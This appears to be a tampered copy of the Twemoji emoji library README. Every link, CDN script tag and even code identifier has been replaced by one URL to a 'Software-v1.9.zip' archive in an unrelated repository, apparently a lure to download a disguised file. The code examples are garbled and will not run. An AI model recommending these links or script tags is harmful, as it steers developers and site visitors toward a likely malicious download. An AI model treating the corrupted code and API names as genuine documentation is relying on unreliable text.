# Twitter Emoji (Twemoji) [![Build Status](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip)](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip)

A simple library that provides standard Unicode [emoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) support across all platforms.

**Twemoji v14.0** adheres to the [Unicode 14.0 spec](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) and supports the [Emoji 14.0 spec](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip). _We do not support custom emoji._

The Twemoji library offers support for all Unicode-defined emoji which are recommended for general interchange (RGI).

## Usage

### CDN Support

The folks over at [MaxCDN](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) have graciously provided CDN support.

Use the following in the `<head>` tag of your HTML document(s):

```html
<script src="https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip" crossorigin="anonymous"></script>
```

This guarantees that you will always use the latest version of the library.

If, instead, you'd like to include the latest version explicitly, you can add the following tag:
```html
<script src="https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip" integrity="sha384-32KMvAMS4DUBcQtHG6fzADguo/tpN1Nh6BAJa2QqZc6/i0K+YPQE+bWiqBRAWuFs" crossorigin="anonymous"></script>
```

### Download

If instead you want to download a specific version, please look at the `gh-pages` branch, where you will find the built assets for both our latest and older versions.

## API

Following are all the methods exposed in the `twemoji` namespace.

### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip( ... ) V1

This is the main parsing utility and has 3 overloads per parsing type.

Although there are two kinds of parsing supported by this utility, we recommend you use [DOM parsing](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip), explained below. Each type of parsing accepts a callback to generate an image source or an options object with parsing info.

The second kind of parsing is string parsing, explained in the legacy documentation [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip). This is unrecommended because this method does not sanitize the string or otherwise prevent malicious code from being executed; such sanitization is out of scope.

#### DOM parsing

If the first argument to `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip` is an `HTMLElement`, generated image tags will replace emoji that are **inside `#text` nodes only** without compromising surrounding nodes or listeners, and completely avoiding the usage of `innerHTML`.

If security is a major concern, this parsing can be considered the safest option but with a slight performance penalty due to DOM operations that are inevitably *costly*.

```js
var div = https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip('div');
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip = 'I \u2764\uFE0F emoji!';
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip(div);

https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip);

var img = https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip('img');

// note the div is preserved
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip === div; // true

https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip;        // https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip;        // \u2764\uFE0F
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip;  // emoji
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip;  // false

```

All other overloads described for `string` are available in exactly the same way for DOM parsing.

### Object as parameter

Here's the list of properties accepted by the optional object that can be passed to the `parse` function.

```js
  {
    callback: Function,   // default the common replacer
    attributes: Function, // default returns {}
    base: string,         // default MaxCDN
    ext: string,          // default ".png"
    className: string,    // default "emoji"
    size: string|number,  // default "72x72"
    folder: string        // in case it's specified
                          // it replaces .size info, if any
  }
```

#### callback

The function to invoke in order to generate image `src`(s).

By default it is a function like the following one:

```js
function imageSourceGenerator(icon, options) {
  return ''.concat(
    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, // by default Twitter Inc. CDN
    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, // by default "72x72" string
    '/',
    icon,         // the found emoji as code point
    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip   // by default ".png"
  );
}
```

#### base

The default url is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip`, so if you modify the former, it will reflect as default for all parsed strings or nodes.

#### ext

The default image extension is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip` which is `".png"`.

If you modify the former, it will reflect as default for all parsed strings or nodes.

#### className

The default `class` for each generated image is `emoji`. It is possible to specify a different one through this property.

##### size

The default asset size is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip` which is `"72x72"`.

If you modify the former, it will reflect as default for all parsed strings or nodes.

#### folder

In case you don't want to specify a size for the image. It is possible to choose a folder, as in the case of SVG emoji.

```js
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip(genericNode, {
  folder: 'svg',
  ext: '.svg'
});
```

This will generate urls such `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip` instead of using a specific size based image.

## Utilities

Basic utilities / helpers to convert code points to JavaScript surrogates and vice versa.

### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip()

For a given HEX codepoint, returns UTF-16 surrogate pairs.

```js
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip('1f1e8');
 // "\ud83c\udde8"
```

### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip()

For given UTF-16 surrogate pairs, returns the equivalent HEX codepoint.

```js
 https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip('\ud83c\udde8\ud83c\uddf3');
 // "1f1e8-1f1f3"

 https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip('\ud83c\udde8\ud83c\uddf3', '~');
 // "1f1e8~1f1f3"
```

## Tips

### Inline Styles

If you'd like to size the emoji according to the surrounding text, you can add the following CSS to your stylesheet:

```css
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip {
   height: 1em;
   width: 1em;
   margin: 0 .05em 0 .1em;
   vertical-align: -0.1em;
}
```

This will make sure emoji derive their width and height from the `font-size` of the text they're shown with. It also adds just a little bit of space before and after each emoji, and pulls them upwards a little bit for better optical alignment.

### UTF-8 Character Set

To properly support emoji, the document character set must be set to UTF-8. This can be done by including the following meta tag in the document `<head>`

```html
<meta charset="utf-8">
```

### Exclude Characters (V1)

To exclude certain characters from being replaced by https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, call https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip() with a callback, returning false for the specific unicode icon. For example:

```js
https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, {
    callback: function(icon, options, variant) {
        switch ( icon ) {
            case 'a9':      // © copyright
            case 'ae':      // ® registered trademark
            case '2122':    // ™ trademark
                return false;
        }
        return ''.concat(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip, '/', icon, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip);
    }
});
```

## Legacy API (V1)

If you're still using our V1 API, you can read our legacy documentation [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip).

## Contributing

The contributing documentation can be found [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip).

## Attribution Requirements

As an open source project, attribution is critical from a legal, practical and motivational perspective in our opinion. The graphics are licensed under the CC-BY 4.0 which has a pretty good guide on [best practices for attribution](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip).

However, we consider the guide a bit onerous and as a project, will accept a mention in a project README or an 'About' section or footer on a website. In mobile applications, a common place would be in the Settings/About section (for example, see the mobile Twitter application Settings->About->Legal section). We would consider a mention in the HTML/JS source sufficient also.

## Community Projects

* [Twemoji Cheatsheet](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@ShahriarKh](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): An easy-to-use cheatsheet for exploring, copying and downloading emojis!
* [Twemoji Amazing](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@SebastianAigner](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji using CSS classes (like [Font Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip)).
* [Twemoji Ruby](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@JollyGoodCode](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji in Ruby.
* [Twemoji Utils](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@gustavwilliam](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Utilities for finding and downloading Twemoji source files.
* [Twemoji for Pencil](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@Nathanielnw](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji in Pencil.
* [FrwTwemoji - Twemoji in dotnet](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@FrenchW](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji in any dotnet project (C#, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip ...).
* [Emojiawesome - Twemoji for Yellow](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@datenstrom](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji on your website.
* [EmojiPanel for Twitter](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@danielbovey](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Insert Twemoji into your tweets on https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip
* [Twitter Color Emoji font](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@bderickson](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji as your system default font on Linux & OS X.
* [Emojica](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@xoudini](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): An iOS framework allowing you to replace all standard emoji in strings with Twemoji.
* [gwt-twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@nbartels](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji in GWT
* [JavaFXEmojiTextFlow](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@pavlobu](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): A JavaFX library allowing you to replace all standard emoji in extended EmojiTextFlow with Twemoji.
* [Vue Twemoji Picker](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@kevinfaguiar](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): A fast plug-n-play Twemoji Picker (+textarea for Twemoji rendering) for Vue.
* [Unmaintained] [Twemoji Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@ellekasai](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji using CSS classes (like [Font Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip)).
* [EmojiOnRoku](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@KasperGam](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji on Roku!
* [LaTeX Twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use Twemoji in LaTeX.
* [PHP Twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip) by [@Astrotomic](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip): Use twemoji within your PHP website project's by replacing standard Emoji with twemoji urls.

## Committers and Contributors

* Justine De Caires (Twitter)
* Jason Sofonia (Twitter)
* Bryan Haggerty (ex-Twitter)
* Nathan Downs (ex-Twitter)
* Tom Wuttke (ex-Twitter)
* Andrea Giammarchi (ex-Twitter)
* Joen Asmussen (WordPress)
* Marcus Kazmierczak (WordPress)

The goal of this project is to simply provide emoji for everyone. We definitely welcome improvements and fixes, but we may not merge every pull request suggested by the community due to the simple nature of the project.

The rules for contributing are available in the `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip` file.

Thank you to all of our [contributors](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip).

## License

Copyright 2019 Twitter, Inc and other contributors

Code licensed under the MIT License: <https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip>

Graphics licensed under CC-BY 4.0: <https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software-v1.9.zip>
